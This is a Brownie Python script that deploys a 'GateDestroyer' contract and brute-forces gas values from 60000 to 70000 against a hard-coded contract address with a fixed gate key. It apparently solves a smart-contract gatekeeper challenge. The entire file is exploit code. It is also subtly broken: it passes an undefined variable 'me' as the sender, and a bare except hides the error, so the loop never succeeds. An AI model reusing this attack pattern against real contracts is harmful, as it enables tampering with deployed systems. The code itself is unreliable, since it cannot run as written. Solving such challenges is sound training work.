from brownie import accounts, chain, web3, GateDestroyer
import brownie
import pytest


def main():
    caller = accounts.load('accountDeploy01')
    gate_destroyer = caller.deploy(
        GateDestroyer,
        publish_source=True
    )

    for i in range(60000, 70000):
        try:
            res = gate_destroyer.passThrough(
                "0x6A9cbDE812957C8a0BD5e3B64409255b05670a67",
                i,
                "0x00000001000005A4",
                {"from": me, "gas": 100000}
            )
            print("success")
            break
        except:
            if i % 500 == 0:
                print(i)
